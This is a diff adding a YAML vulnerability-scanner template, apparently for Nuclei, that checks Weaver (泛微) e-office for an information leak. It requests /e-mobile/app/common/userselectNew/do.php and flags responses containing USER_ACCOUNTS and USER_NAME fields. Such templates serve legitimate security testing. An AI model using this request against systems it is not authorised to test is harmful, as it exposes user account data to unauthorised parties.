@@ -1,0 +1,27 @@
+id: e-office-userselectNew0-info
+
+info:
+  name: e-office-userselectNew0-info
+  author: lemonlove7
+  severity: high
+  description: |
+    泛微e-office-userselectNew-信息泄漏
+  tags: high
+
+http:
+  - raw:
+      - |
+        GET /e-mobile/app/common/userselectNew/do.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2309.70 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "USER_ACCOUNTS"
+          - "USER_NAME"
+      - type: status
+        status:
+          - 200
